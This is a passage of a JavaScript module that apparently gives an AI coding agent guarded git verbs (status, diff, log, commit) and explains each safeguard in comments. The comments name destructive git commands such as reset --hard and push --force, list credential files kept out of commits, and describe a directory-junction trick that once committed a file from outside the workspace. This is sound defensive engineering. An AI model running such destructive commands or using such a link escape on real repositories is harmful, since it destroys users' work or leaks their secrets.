/**
 * ── ⭐ GIT — THE AGENT CAN FINALLY SEE WHAT IT CHANGED ───────────────────────
 *
 * Until now the CLI wrote files and had no idea what it had done to the repo.
 * That gap is bigger than it sounds, because it removes the one check a human
 * developer performs constantly and for free: `git diff` before committing.
 * Without it the model's only model of the working tree is its own memory of
 * the files it wrote this session — which is wrong the moment anything existed
 * before the session started.
 *
 * ── ⚠️ WHY GIT IS NOT A `run_command` BINARY ────────────────────────────────
 * The obvious implementation is to add `git` to `ALLOWED_BINARIES`. It is the
 * wrong one, twice over, and both reasons are structural rather than fussy:
 *
 *   1. **The character whitelist would make commit impossible.** `command.mjs`
 *      refuses quotes, so a commit message could never contain an apostrophe, a
 *      comma, a newline or a colon — i.e. could never be a commit message. The
 *      only way to allow one through a command STRING is to weaken the
 *      whitelist that protects every other command, for the sake of one verb.
 *   2. **Git's surface is enormous and mostly destructive.** `reset --hard`,
 *      `checkout .`, `clean -fdx`, `push --force`, `filter-branch` — an agent
 *      with a git command string is one hallucination away from deleting work
 *      that was never its own. A flag denylist for a program with a thousand
 *      flags is a promise nobody can keep.
 *
 * ⭐ So git is exposed as STRUCTURED VERBS. The model supplies parameters, this
 * file builds the exact `argv`, and there is no path from a model-authored
 * string to a git subcommand it was not given. `push`, `reset`, `checkout`,
 * `clean`, `rebase` and `remote` are not refused by a check — they are simply
 * not expressible. That is the whitelist doctrine the rest of the package uses,
 * applied where it matters most.
 *
 * ── ⚠️ THE SUBDIRECTORY TRAP, WHICH IS THE REAL BUG IN HERE ─────────────────
 * `git` walks UP from its cwd to find a repository. Point this CLI at
 * `~/work/monorepo/packages/thing` and every command silently operates on the
 * whole monorepo: `git status` reports other people's work in progress, and a
 * commit lands in a repository the user never pointed us at. Nothing errors.
 *
 * So every verb first resolves `--show-toplevel` and REFUSES unless it equals
 * the workspace root. A workspace inside someone else's repo is a legitimate
 * place to write code and never a legitimate place to commit from.
 *
 * ── ⚠️⚠️ AND THE SECOND ESCAPE, WHICH THAT ONE DOES NOT CATCH (fixed 08-11) ──
 * Proving the REPO is the workspace says nothing about whether a PATH inside it
 * really is. `gitCommit` validated its paths with `normalizeRelativePath` — the
 * pure, LEXICAL half of the workspace guard, which by design never touches the
 * disk and therefore cannot see a link. Measured in a scratch repo: a directory
 * junction (`mklink /J`, no elevation) pointing out of the workspace let
 * `paths: ['link/secret.txt']` commit an outside file, `ok: true`, and
 * `git show HEAD:link/secret.txt` printed its contents.
 *
 * ⭐ So the containment every file verb enforces — `resolveInWorkspace`, i.e.
 * realpath the deepest EXISTING ancestor and compare against the realpath'd root
 * — is now applied in `gitCommit` too, and by the same means rather than a
 * second invention. The full argument, including why it is not too tight, sits
 * at the check itself; the bidirectional proof is
 * `test/git-commit-containment.test.mjs`.
 */

import { realpathSync, statSync } from 'node:fs';
import { isAbsolute, relative, resolve, sep } from 'node:path';

import { clampOutput, scrubEnvironment, spawnBounded } from './command.mjs';
import { normalizeRelativePath, resolveInWorkspace } from './workspace.mjs';

/**
 * ⚠️ THE SHAPES ARE DECLARED, NOT INFERRED — the same rule `workspace.mjs` and
 * `command.mjs` follow, and for the same reason. Left to inference, `ok` widens
 * to `boolean` instead of the literals, so a caller that has ALREADY checked
 * `if (!r.ok)` still cannot reach `r.error` without a cast. A discriminated
 * union is what makes the refusal path type-safe at every call site.
 *
 * @typedef {{ ok: false, error: string }} GitRefused
 * @typedef {{ ok: true, exitCode: number | null, stdout: string, stderr: string, timedOut: boolean }} GitRan
 * @typedef {(file: string, args: string[], opts: object) => any} SpawnImpl
 * @typedef {{ spawnImpl?: SpawnImpl }} GitOpts
 */

/** Git is fast or wedged; there is no slow-but-fine case worth waiting on. */
export const GIT_TIMEOUT_MS = 20_000;
/** A diff is the output most likely to be enormous, and the model pays per token. */
export const MAX_DIFF_CHARS = 12_000;
export const MAX_COMMIT_MESSAGE_CHARS = 4_000;
export const MAX_COMMIT_PATHS = 50;
/** More than this and the answer is "read the log yourself". */
export const MAX_LOG_COUNT = 50;

/**
 * ⚠️ NEVER STAGED, WHATEVER THE MODEL ASKS OR `.gitignore` SAYS.
 *
 * The failure this prevents: the agent writes a `.env` so the app it just built
 * can run, then helpfully commits "all the project files". The secret is now in
 * history — a place from which deleting it does not remove it — and the repo may
 * be pushed by a human later who has no idea it is in there.
 *
 * Git already refuses ignored files without `-f` (which is never passed), so
 * this only fires when the file is NOT ignored, which is exactly the dangerous
 * case: the repository has no protection and nobody noticed.
 */
/**
 * ⚠️⚠️ THIS IS THE ONE LIST. `read-window.mjs` used to keep a second one
 * (`CREDENTIAL_BASENAME`) for `read_lines` and `read_around`, written
 * separately, and the two DISAGREED. Measured 2026-08-13 through the real
 * dispatcher:
 *
 *   read_lines LEAKED : vault.pfx · keys.jks · secrets.json · credentials.yml
 *                       · service-account.json
 *   read_file  LEAKED : .git-credentials
 *
 * Each list covered holes the other left, so which of a user's secrets were
 * protected depended on which verb the model happened to pick. Both consumers
 * now call `refusedCommitPath`, and `.git-credentials` — which only the other
 * list had — is folded in below. Add the next pattern HERE and every consumer
 * gains it at once.
 */
/**
 * ⚠️ THE LIST MOVED TO `secret-paths.mjs`, A LEAF MODULE, and this file now
 * IMPORTS it like everyone else. `workspace.mjs` needs it for `move_file` — a
 * rename is the one verb that can relabel `.env` into something committable —
 * and importing it from here closed a cycle the bundler cannot order:
 *     command.mjs → workspace.mjs → git.mjs → command.mjs
 *
 * ⚠️ AND IT IS NOT RE-EXPORTED FROM HERE. `export { x } from` is a form
 * `scripts/bundle.mjs` refuses outright ("a bundler that half-supports a form
 * is how a bundle ends up one byte wrong"), so every consumer imports the leaf
 * directly. Caught by the bundle test, not by the suite — Node runs a cycle
 * and a re-export happily, so nothing looked wrong until ship time.
 */
import { refusedCommitPath } from './secret-paths.mjs';

/**
 * ⚠️ THE GIT ENVIRONMENT, AND WHY IT IS MORE LOCKED DOWN THAN THE COMMAND ONE.
 *
 * `scrubEnvironment` already removes conventionally-named secrets. On top of
 * that:
 *
 * · `GIT_TERMINAL_PROMPT=0` — git asking for a username on a machine with no
 *   terminal attached is a process that hangs until the timeout kills it. Every
 *   credential prompt becomes an immediate, legible error instead.
 * · `GIT_PAGER=cat` + `--no-pager` — a pager waits for a keypress that will
 *   never come. Same hang, different cause, so both are closed.
 * · `GIT_OPTIONAL_LOCKS=0` — a plain `status` should not take the index lock
 *   and fight the editor the user has open in the same repo.
 *
 * ⚠️⚠️ THIS PARAGRAPH USED TO SAY GIT HERE HAD "NOWHERE TO SEND ANYTHING".
 * That stopped being true on 2026-08-14 when `git_push` landed. It is still
 * true of THIS function: `gitEnvironment` is the environment for every LOCAL
 * verb, and a local verb has no business holding a credential. The one verb
 * that leaves the machine builds its own environment in `pushEnvironment`
 * below, restores exactly one variable, and says why.
 */
export function gitEnvironment(env = process.env) {
  const out = scrubEnvironment(env);
  out.GIT_TERMINAL_PROMPT = '0';
  out.GIT_PAGER = 'cat';
  out.GIT_OPTIONAL_LOCKS = '0';
  return out;
}

/**
 * ── ⚠️⚠️ THE SCRUB DELETES `SSH_AUTH_SOCK`, AND PUSH IS THE VERB THAT NEEDS IT ──
 *
 * `SECRET_NAME` in command.mjs is `/(KEY|TOKEN|SECRET|…|AUTH|…)/i` — read it at
 * `command.mjs:814`. `SSH_AUTH_SOCK` contains "AUTH", so `scrubEnvironment`
 * drops it, and every other verb in this file is happier for that. A push over
 * `git@github.com:` with no agent socket does not hang (GIT_TERMINAL_PROMPT=0)
 * — it fails with "Permission denied (publickey)", which reads like a broken
 * key rather than an environment we emptied ourselves.
 *
 * ⭐ SO PUSH GETS THE SOCKET BACK AND NOTHING ELSE. The value is a path to a
 * unix socket / named pipe, not a secret; the agent behind it will only ever
 * sign a challenge for a process that can reach it, and the argv reaching it
 * was built by this file. HTTPS remotes need nothing here — git's credential
 * helper is a separate program driven by config, not by our environment — and
 * `GITHUB_TOKEN` stays deleted, because git does not read it and `github.mjs`
 * fetches its own copy for the API call.
 *
 * ⚠️ HONEST LIMIT: this is REASONED, not measured. The push proof in
 * `test/git-deliver.test.mjs` pushes to a LOCAL BARE REPOSITORY, which needs no
 * credential at all, so it does not exercise SSH. What IS measured is the shape
 * of the environment — `test/git-deliver.test.mjs` asserts the socket survives
 * and `OPENROUTER_API_KEY` does not.
 */
export const PUSH_ENV_KEEP = Object.freeze(['SSH_AUTH_SOCK', 'SSH_AGENT_PID']);

export function pushEnvironment(env = process.env) {
  const out = gitEnvironment(env);
  for (const name of PUSH_ENV_KEEP) {
    const value = env[name];
    if (typeof value === 'string' && value !== '') out[name] = value;
  }
  return out;
}

/**
 * Run git with an argv this file constructed. `args` never contains anything
 * derived from a model string except as a SEPARATE ARRAY ELEMENT, which is
 * where the safety comes from: an element is one argument no matter what is in
 * it, because no shell exists to re-split it.
 */
/** @returns {Promise<GitRefused | GitRan>} */
async function git(root, args, { spawnImpl, timeoutMs = GIT_TIMEOUT_MS, env = null } = {}) {
  const run = await spawnBounded({
    file: 'git',
    args: ['--no-pager', ...args],
    cwd: root,
    timeoutMs,
    spawnImpl,
    // ⚠️ `env` IS AN OVERRIDE, NOT A REPLACEMENT OF THE RULE. Every local verb
    // gets `gitEnvironment()`; only `gitPush` passes anything, and what it
    // passes is `pushEnvironment()` — which is `gitEnvironment()` plus the ssh
    // agent socket. There is no path here to an unscrubbed environment.
    env: env ?? gitEnvironment(),
  });
  if (!run.ok) {
    /**
     * ⚠️ ENOENT HERE MEANS GIT IS NOT INSTALLED, and the raw spawn error says
     * "spawn git ENOENT", which reads like a bug in this CLI rather than a
     * missing program. Translate it once, here.
     */
    const missing = /ENOENT/.test(run.error ?? '');
    return { ok: false, error: missing ? 'git is not installed, or not on PATH for this process' : run.error };
  }
  return {
    ok: true,
    exitCode: run.exitCode,
    stdout: run.stdout,
    stderr: run.stderr,
    timedOut: run.timedOut,
  };
}

/**
 * ── ⚠️⚠️ `realpath` DOES NOT EXPAND AN 8.3 SHORT NAME, AND GIT RETURNS THE LONG ONE ──
 *
 * Measured on Windows 2026-08-13, and it is not a corner case:
 *
 *     C:\...\Temp\ACUVOR~1            (the 8.3 alias, what the caller had)
 *     realpathSync(...)   -> C:\...\Temp\ACUVOR~1          ← unchanged
 *     git rev-parse       -> C:/.../Temp/acuvorunneradminprobe
 *
 * Two spellings of ONE directory, and the string compare above — case-folded,
 * realpath'd, and written precisely to avoid being "too literal" — still calls
 * them different. Every git verb is then refused with "this workspace is INSIDE
 * a git repository rooted at …", naming a path that IS the workspace.
 *
 * ⭐ WHO HITS IT: anyone reached through an 8.3 alias, which Windows generates
 * for any name over eight characters. `C:\Users\<name>` longer than eight,
 * `C:\PROGRA~1`, and — the reason this surfaced at all — GitHub's own Windows
 * runner, where `runneradmin` is `RUNNER~1`. It broke SEVEN tests the moment
 * the Windows matrix first executed.
 *
 * ⭐ THE FIX IS TO STOP COMPARING SPELLINGS. The question was never "are these
 * strings equal", it is "are these the same directory", and the filesystem
 * answers that directly: device + inode. Node exposes both on Windows (the
 * inode is the NTFS file index), so this needs no dependency and no platform
 * branch. `bigint: true` because a 64-bit file index does not survive a double.
 *
 * ⚠️ It can only ever turn a refusal INTO an allow, and only when the two paths
 * are provably one directory — a genuine outer repository is a different
 * directory with a different index, so the guard this backs up is untouched.
 * Anything unreadable, or a filesystem that reports no inode at all (0 on some
 * network and FAT volumes), falls back to the string compare rather than
 * guessing: unknown identity must not read as "same".
 */
function sameDirectoryOnDisk(a, b) {
  try {
    const sa = statSync(a, { bigint: true });
    const sb = statSync(b, { bigint: true });
    if (sa.ino === 0n || sb.ino === 0n) return false;
    return sa.dev === sb.dev && sa.ino === sb.ino;
  } catch {
    return false;
  }
}

/**
 * Resolve the repository and prove it is THIS workspace — see the subdirectory
 * trap in the header. Every verb goes through here first.
 *
 * ── ⚠️⚠️ THE GUARD WAS APPLIED TO THE READS TOO, AND THAT COST A REAL USER
 *          THEIR WHOLE GIT SURFACE (fixed 2026-08-14) ────────────────────────
 *
 * MEASURED, in this very checkout, before the fix — `acuvo-code/` is a
 * subdirectory of the outer repository:
 *
 *     gitStatus(root)  -> ok:false  "this workspace is INSIDE a git repository…"
 *     gitDiff(root)    -> ok:false  "this workspace is INSIDE a git repository…"
 *     gitLog(root)     -> ok:false
 *     gitCommit(root)  -> ok:false
 *
 * Four dark verbs, for a workspace layout that is not exotic — it is what every
 * monorepo package looks like. And the two that hurt most are the READS: an
 * agent that just edited three files could not look at its own diff.
 *
 * ⭐ THE GUARD'S ARGUMENT ONLY EVER APPLIED TO WRITING. Re-read the header: the
 * danger is "a commit lands in a repository the user never pointed us at" and
 * "status reports other people's work in progress". The first is about writing
 * history. The second is not an argument for refusing — it is an argument for
 * SCOPING, which git does natively and for free: run from the workspace with a
 * `.` pathspec and the answer is about the workspace and nothing else.
 *
 * So: `allowSubdirectory: true` is passed by `gitStatus`, `gitDiff` and
 * `gitLog`, which then scope every question to the workspace directory and
 * report paths relative to it. The write verbs — `gitCommit`, `gitBranch`,
 * `gitPush` — leave it false and still refuse outright, because a commit, a
 * ref and a push are repository-wide acts that cannot be scoped to a
 * subdirectory even in principle.
 *
 * ⚠️ WHY THE READS ARE NOT A LEAK EITHER. Scoped to `.`, they can only report
 * files inside the workspace — the same files `read_file` would happily open.
 * The refusal was not protecting anything the file tools were not already
 * handing over.
 */
/**
 * @param {string} root
 * @param {GitOpts & { allowSubdirectory?: boolean }} [opts]
 * @returns {Promise<GitRefused | { ok: true, root: string, subdirectory: string }>}
 */
export async function resolveRepo(root, { spawnImpl, allowSubdirectory = false } = {}) {
  const top = await git(root, ['rev-parse', '--show-toplevel'], { spawnImpl });
  if (!top.ok) return top;
  if (top.exitCode !== 0) {
    return { ok: false, error: 'this workspace is not a git repository, so there is nothing to inspect or commit' };
  }
  const reported = top.stdout.trim();
  if (!reported) return { ok: false, error: 'git did not report a repository root' };

  /**
   * ⚠️ COMPARED THROUGH `realpath`, NOT AS STRINGS. Git prints forward slashes
   * on Windows and resolves symlinks; the workspace root may be `C:\...` and a
   * symlinked path besides. A string compare would report a MISMATCH for the
   * ordinary case and refuse to work at all — the failure mode of a safety
   * check that is too literal is that it gets deleted.
   */
  let a; let b;
  try {
    a = realpathSync(resolve(reported));
    b = realpathSync(resolve(root));
  } catch (err) {
    return { ok: false, error: `could not resolve the repository path: ${err instanceof Error ? err.message : String(err)}` };
  }
  const same = (process.platform === 'win32' ? a.toLowerCase() === b.toLowerCase() : a === b)
    || sameDirectoryOnDisk(a, b);
  if (!same && allowSubdirectory) {
    /**
     * ⭐ THE READ PATH. The workspace is somewhere inside the repository, which
     * is the ordinary monorepo-package shape. Work out where, so the caller can
     * scope its question to `.` and strip the prefix off what git reports.
     *
     * ⚠️ `relative()` IS ASKED IN THE REALPATH'D WORLD, both sides, so a repo
     * under a junctioned home directory does not read as an escape — the same
     * reason the compare above is realpath'd.
     *
     * ⚠️ AND IT CAN STILL SAY NO. If the workspace does not resolve INSIDE the
     * reported repository root, this is not a subdirectory at all: git found a
     * repository by walking up from a path that realpath moved elsewhere. That
     * is the one shape where scoping would be a guess, so it keeps the refusal.
     */
    const rel = relative(a, b);
    if (rel && !rel.startsWith('..') && !isAbsolute(rel)) {
      return { ok: true, root: a, subdirectory: rel.split(sep).join('/') };
    }
  }
  if (!same) {
    /**
     * ⚠️ IT NAMES BOTH SIDES, AND THAT IS NOT DECORATION.
     *
     * This refusal used to print only the repository root. When it fired on a
     * Windows CI runner against a repo that WAS its own root, the message said
     * "you are inside a repository rooted at X" where X was, to the eye, the
     * workspace itself — an accusation with no way to check it, about the one
     * mechanism that gates every git verb. The comparison is between two
     * realpath'd strings, so the only useful thing to print is BOTH of them.
     *
     * ⭐ A safety check that is too literal gets deleted, and the step before
     * deletion is a user who cannot tell whether it is right.
     */
    return {
      ok: false,
      error:
        `this workspace is INSIDE a git repository rooted at ${reported}, not at the workspace root. `
        + 'Writing verbs are refused here: a commit, a branch or a push is repository-wide, and would '
        + 'act on the whole outer repository, which nobody pointed this agent at. '
        + 'git_status, git_diff and git_log still work — they are scoped to this directory. '
        + `(repository root resolves to "${a}"; the workspace root resolves to "${b}")`,
    };
  }
  return { ok: true, root: b, subdirectory: '' };
}

/** Parse `status --porcelain=v1` into something a model can reason about. */
export function parseStatus(porcelain) {
  const files = [];
  for (const raw of String(porcelain).split('\n')) {
    if (raw.length < 4) continue;
    const x = raw[0];
    const y = raw[1];
    let path = raw.slice(3);
    // A rename is printed as `old -> new`; the new name is the useful one.
    const arrow = path.indexOf(' -> ');
    if (arrow !== -1) path = path.slice(arrow + 4);
    files.push({
      path: path.replace(/^"|"$/g, ''),
      staged: x !== ' ' && x !== '?',
      // `??` is untracked — new work, which is the common case for this agent
      // and the one a model most often forgets it has to `add`.
      untracked: x === '?' && y === '?',
      code: `${x}${y}`,
    });
  }
  return files;
}

/**
 * @param {string} root
 * @param {GitOpts} [opts]
 * @returns {Promise<GitRefused | { ok: true, branch: string, files: {path:string,staged:boolean,untracked:boolean,code:string}[], clean: boolean }>}
 */
export async function gitStatus(root, { spawnImpl } = {}) {
  const repo = await resolveRepo(root, { spawnImpl, allowSubdirectory: true });
  if (!repo.ok) return repo;

  /**
   * ⭐ `-- .` IS THE WHOLE CONTAINMENT STORY FOR A READ. Pathspecs are resolved
   * relative to the process cwd, and cwd is the workspace, so this asks about
   * the workspace directory and nothing else. At the repository root the
   * pathspec is omitted entirely, so the ordinary case is byte-identical to
   * what this function ran before.
   */
  const statusArgs = ['status', '--porcelain=v1'];
  if (repo.subdirectory) statusArgs.push('--', '.');

  const [status, branch] = await Promise.all([
    git(root, statusArgs, { spawnImpl }),
    git(root, ['rev-parse', '--abbrev-ref', 'HEAD'], { spawnImpl }),
  ]);
  if (!status.ok) return status;
  if (status.exitCode !== 0) return { ok: false, error: status.stderr.trim() || 'git status failed' };

  /**
   * ⚠️ PORCELAIN PATHS ARE REPOSITORY-RELATIVE EVEN WITH A PATHSPEC, and there
   * is no `--relative` for `status` (the config knob only touches the long
   * format). So a workspace at `packages/thing` would be handed
   * `packages/thing/src/a.js` — a path `read_file` refuses, because from the
   * workspace the file is `src/a.js`. Stripping the prefix is what makes the
   * result usable by the very next tool call, which is the only reason a status
   * is worth paying for.
   */
  const prefix = repo.subdirectory ? `${repo.subdirectory}/` : '';
  const files = parseStatus(status.stdout).map((f) => (
    prefix && f.path.startsWith(prefix) ? { ...f, path: f.path.slice(prefix.length) } : f
  ));
  return {
    ok: true,
    // ⭐ REPORTED, not hidden. The model is being told about a slice of a bigger
    // repository, and a slice presented as the whole is how a wrong conclusion
    // gets drawn confidently.
    subdirectory: repo.subdirectory || null,
    // ⚠️ A repository with no commits reports a branch name but `rev-parse`
    // fails; an empty string here is honest and the caller renders "(no
    // commits yet)" rather than printing an error for a normal new repo.
    branch: branch.ok && branch.exitCode === 0 ? branch.stdout.trim() : '',
    files,
    clean: files.length === 0,
  };
}

/**
 * @param {string} root
 * @param {{ path?: string | null, staged?: boolean } & GitOpts} [opts]
 * @returns {Promise<GitRefused | { ok: true, staged: boolean, path: string | null, diff: string, truncated: boolean, empty: boolean }>}
 */
export async function gitDiff(root, { path = null, staged = false, spawnImpl } = {}) {
  const repo = await resolveRepo(root, { spawnImpl, allowSubdirectory: true });
  if (!repo.ok) return repo;

  const args = ['diff', '--no-color'];
  if (staged) args.push('--cached');
  /**
   * ── ⭐ `--relative` DOES BOTH JOBS, AND I ONLY BELIEVED THAT AFTER MEASURING ─
   *
   * A diff's paths live inside the PATCH TEXT (`--- a/packages/thing/a.js`), so
   * unlike the status case they cannot be fixed up afterwards — rewriting patch
   * text with a string replace is how a diff stops applying.
   *
   * ⚠️ I FIRST WROTE THIS AS `--relative` PLUS A `-- .` PATHSPEC, on the theory
   * that `--relative` only renames headers and something else had to do the
   * containment. Measured, cwd = `packages/thing`, git 2.50.1, with a change in
   * BOTH `outer.md` and `packages/thing/a.js`:
   *
   *   git diff                     -> both files, repo-relative headers
   *   git diff --relative          -> a.js only, header `a/a.js`     ← both jobs
   *   git diff -- .                -> a.js only, header `a/packages/thing/a.js`
   *   git diff --relative -- .     -> identical to `--relative` alone
   *
   * ⭐ So the pathspec was a second mechanism with NO observable effect — and a
   * mutation test proved it: deleting it left all 21 tests green, which is the
   * definition of a line nothing can hold to account. It is gone. `--relative`
   * excludes changes outside the current directory by itself, which is exactly
   * the containment we wanted, and the one line is falsifiable.
   *
   * ⚠️ Only when we are actually in a subdirectory. At the root it is a no-op,
   * and a no-op flag added "for consistency" is a behaviour change waiting to
   * be discovered by somebody else.
   */
  if (repo.subdirectory) args.push('--relative');
  // ⚠️ "." IS HOW A MODEL SAYS "EVERYTHING", and normalizeRelativePath refuses
  // it ("resolves to the workspace root itself") — correctly, for a file tool.
  // Here it means the default, so it is translated rather than rejected with a
  // message the model would try to work around.
  if (path !== null && path !== undefined && path !== '' && path !== '.' && path !== './') {
    const norm = normalizeRelativePath(path);
    if (!norm.ok) return { ok: false, error: `"${path}" is not a usable path: ${norm.reason}` };
    // ⚠️ `--` FIRST. Without it a path that begins with a dash, or that happens
    // to equal a branch name, is parsed as a revision — and `git diff main`
    // means something entirely different from `git diff -- main`.
    args.push('--', norm.path);
  }
  const run = await git(root, args, { spawnImpl });
  if (!run.ok) return run;
  if (run.exitCode !== 0) return { ok: false, error: run.stderr.trim() || 'git diff failed' };

  const clamped = clampOutput(run.stdout, MAX_DIFF_CHARS);
  return {
    ok: true,
    staged,
    path: path ?? null,
    subdirectory: repo.subdirectory || null,
    diff: clamped.text,
    truncated: clamped.truncated,
    // ⚠️ An empty diff is a RESULT, not a failure — and specifically it is the
    // answer to "did my edit apply?", so it must be reported as a fact rather
    // than as an absence the model has to infer from a blank string.
    empty: run.stdout.trim() === '',
  };
}

/**
 * @param {string} root
 * @param {{ count?: number, path?: string | null } & GitOpts} [opts]
 * @returns {Promise<GitRefused | { ok: true, commits: {hash:string,author:string,when:string,subject:string}[], empty: boolean }>}
 */
export async function gitLog(root, { count = 10, path = null, spawnImpl } = {}) {
  const repo = await resolveRepo(root, { spawnImpl, allowSubdirectory: true });
  if (!repo.ok) return repo;

  const n = Math.min(Math.max(1, Number.isFinite(count) ? Math.floor(count) : 10), MAX_LOG_COUNT);
  // Unit-separator delimited rather than a pretty format with spaces: a subject
  // line contains anything, including whatever character seemed safe to split on.
  const args = ['log', `-n${n}`, '--no-color', '--pretty=format:%h\u001f%an\u001f%ar\u001f%s'];
  if (path) {
    const norm = normalizeRelativePath(path);
    if (!norm.ok) return { ok: false, error: `"${path}" is not a usable path: ${norm.reason}` };
    args.push('--', norm.path);
  } else if (repo.subdirectory) {
    // ⭐ "recent commits" in a monorepo package means recent commits TO THIS
    // PACKAGE. The whole-repo log is somebody else's history and would teach the
    // model the wrong commit-message convention for the directory it is in.
    args.push('--', '.');
  }
  const run = await git(root, args, { spawnImpl });
  if (!run.ok) return run;
  if (run.exitCode !== 0) {
    const err = run.stderr.trim();
    // A brand-new repo has no HEAD; that is not an error worth alarming about.
    if (/does not have any commits yet|unknown revision/i.test(err)) {
      return { ok: true, commits: [], empty: true, subdirectory: repo.subdirectory || null };
    }
    return { ok: false, error: err || 'git log failed' };
  }
  const commits = run.stdout
    .split('\n')
    .filter(Boolean)
    .map((line) => {
      const [hash, author, when, ...subject] = line.split('\u001f');
      return { hash, author, when, subject: subject.join('\u001f') };
    });
  return { ok: true, commits, empty: commits.length === 0, subdirectory: repo.subdirectory || null };
}

/**
 * Validate a model-authored commit message.
 *
 * Pure, and stricter than git is: git accepts almost anything, but a message
 * that starts with `-` becomes a flag at some future call site, and control
 * characters make a log unreadable in ways nobody debugs.
 */
/**
 * @param {unknown} raw
 * @returns {{ ok: true, message: string } | GitRefused}
 */
export function validateCommitMessage(raw) {
  if (typeof raw !== 'string') return { ok: false, error: 'a commit message is required' };
  const message = raw.trim();
  if (!message) return { ok: false, error: 'the commit message is empty — say what changed and why' };
  if (message.length > MAX_COMMIT_MESSAGE_CHARS) {
    return { ok: false, error: `the commit message is ${message.length} characters, over the ${MAX_COMMIT_MESSAGE_CHARS} limit` };
  }
  if (message.startsWith('-')) {
    return { ok: false, error: 'a commit message may not start with "-" — it would be read as a flag' };
  }
  // eslint-disable-next-line no-control-regex
  if (/[\u0000-\u0008\u000b\u000c\u000e-\u001f]/.test(message)) {
    return { ok: false, error: 'the commit message contains control characters (newlines and tabs are fine, nothing else)' };
  }
  return { ok: true, message };
}

/**
 * Stage the named paths and commit them.
 *
 * ── ⚠️ WHY `paths` IS REQUIRED AND THERE IS NO "COMMIT EVERYTHING" ──────────
 * `git add -A` is one keystroke for a human who can see the file list, and a
 * loaded gun for an agent that cannot. It sweeps up the scratch file, the
 * accidental 40MB fixture, the other lane's half-finished work in the same
 * checkout, and the `.env` written two tool calls ago. Requiring the paths
 * forces the model to have looked — which is the behaviour we want anyway, and
 * `git_status` is right there.
 */
/**
 * @param {string} root
 * @param {{ message?: unknown, paths?: unknown, dryRun?: boolean } & GitOpts} [opts]
 * @returns {Promise<GitRefused | { ok: true, hash: string, message: string, files: string[], fileCount: number }>}
 */
export async function gitCommit(root, { message, paths, spawnImpl, dryRun = false } = {}) {
  const repo = await resolveRepo(root, { spawnImpl });
  if (!repo.ok) return repo;

  const valid = validateCommitMessage(message);
  if (!valid.ok) return valid;

  if (!Array.isArray(paths) || paths.length === 0) {
    return { ok: false, error: 'paths is required — name the files to commit. Call git_status first; there is no "commit everything".' };
  }
  if (paths.length > MAX_COMMIT_PATHS) {
    return { ok: false, error: `${paths.length} paths is over the ${MAX_COMMIT_PATHS} limit for one commit` };
  }

  const clean = [];
  for (const p of paths) {
    const norm = normalizeRelativePath(p);
    if (!norm.ok) return { ok: false, error: `"${p}" is not a usable path: ${norm.reason}` };
    const refused = refusedCommitPath(norm.path);
    if (refused) return { ok: false, error: refused };
    /**
     * ── ⚠️⚠️ THE CONTAINMENT CHECK, AND WHY IT CANNOT BE THE LEXICAL ONE ─────
     *
     * `normalizeRelativePath` above is PURE — it never touches the disk, so it
     * refuses `../x` and `C:\x` and cannot possibly see that `link/` is a
     * junction to somewhere else. For months that was the only guard on the one
     * verb in this package that writes PERMANENT HISTORY, while `write_file`,
     * `read_file` and `delete_file` all went through `resolveInWorkspace`.
     *
     * ⭐ Measured on 2026-08-11, `mklink /J` needing no elevation:
     *     repo/link -> ../outside ; gitCommit(paths:['link/secret.txt'])
     *     -> ok:true, and `git show HEAD:link/secret.txt` printed the outside
     *     file. Deleting it afterwards does not remove it from history.
     *
     * ⚠️ ON POSIX `git add` REFUSES "beyond a symbolic link" ITSELF, which is
     * exactly why this went unnoticed: git covered for the missing guard on the
     * platform nobody here runs on. A Windows directory junction is not a
     * symlink to git — it walks through it as an ordinary directory.
     *
     * So the answer is the SAME mechanism the file tools use, not a second
     * invention: realpath the deepest EXISTING ancestor and compare against the
     * realpath'd root. That is also what keeps it from being too tight —
     * · the root is realpath'd too, so a repo under a junctioned/symlinked home
     *   directory is normal rather than an escape;
     * · a path that does not exist is contained by its parent, so staging a
     *   DELETION (the file is gone — that IS the commit) still works;
     * · `isInside` folds case, so a drive letter in the other case is not a
     *   mismatch;
     * · a link pointing back INSIDE the workspace resolves inside and is allowed.
     *
     * ⚠️ Intent is 'read', deliberately. 'write' would additionally refuse
     * `node_modules/`, `.next/` and `.vercel/` with "it executes code on the
     * owner's next command" — true of writing a file there and NOT true of
     * recording one in history, and a repository that deliberately vendors its
     * dependencies is somebody's real, legitimate commit. This check is about
     * containment and nothing else.
     *
     * ⚠️ And it runs in the validation loop, BEFORE `git add`. Refusing after
     * staging would leave the good paths of a mixed commit sitting in the index
     * for the next commit to sweep up silently.
     */
    const contained = resolveInWorkspace(repo.root, norm.path, 'read');
    if (!contained.ok) {
      return {
        ok: false,
        error:
          `"${p}" cannot be committed: ${contained.reason}. It resolves outside the workspace `
          + `(${repo.root}) once links are followed, and committing it would put a file nobody `
          + 'pointed this agent at into permanent history. Commit only paths that live inside the workspace.',
      };
    }
    clean.push(norm.path);
  }

  if (dryRun) {
    return { ok: false, error: 'this is a --dry-run, so nothing is staged or committed' };
  }

  // `--` again: a path called `main` must not be read as a revision.
  const add = await git(root, ['add', '--', ...clean], { spawnImpl });
  if (!add.ok) return add;
  if (add.exitCode !== 0) {
    const err = add.stderr.trim();
    /**
     * ⚠️ THE IGNORED-FILE REFUSAL IS A FEATURE AND MUST READ LIKE ONE. Git's own
     * message suggests `-f`, which this agent will never pass; left unrewritten
     * the model reads the hint, tries to obey it, and burns a round discovering
     * the flag does not exist here.
     */
    if (/ignored by one of your \.gitignore|is ignored/i.test(err)) {
      return { ok: false, error: `${err}\n\nThat file is gitignored and this agent never force-adds — leave it out of the commit.` };
    }
    return { ok: false, error: err || 'git add failed' };
  }

  const staged = await git(root, ['diff', '--cached', '--name-only'], { spawnImpl });
  const stagedFiles = staged.ok ? staged.stdout.split('\n').map((s) => s.trim()).filter(Boolean) : [];
  if (stagedFiles.length === 0) {
    /**
     * ⚠️ CAUGHT BEFORE COMMITTING, because `git commit` with nothing staged
     * exits non-zero with a wall of advice, and the model reads a failed commit
     * as "something broke" when the truth is "those files are already
     * committed, unchanged" — a completely different next action.
     */
    return { ok: false, error: 'nothing to commit: those paths have no changes staged (they may already be committed, or identical to HEAD)' };
  }

  const commit = await git(root, ['commit', '-m', valid.message], { spawnImpl });
  if (!commit.ok) return commit;
  if (commit.exitCode !== 0) {
    const err = `${commit.stdout}\n${commit.stderr}`.trim();
    if (/Please tell me who you are|unable to auto-detect email|empty ident name/i.test(err)) {
      return {
        ok: false,
        error: 'git has no author identity configured on this machine, so it cannot record a commit. Set user.name and user.email in your git config and ask again.',
      };
    }
    return { ok: false, error: err || 'git commit failed' };
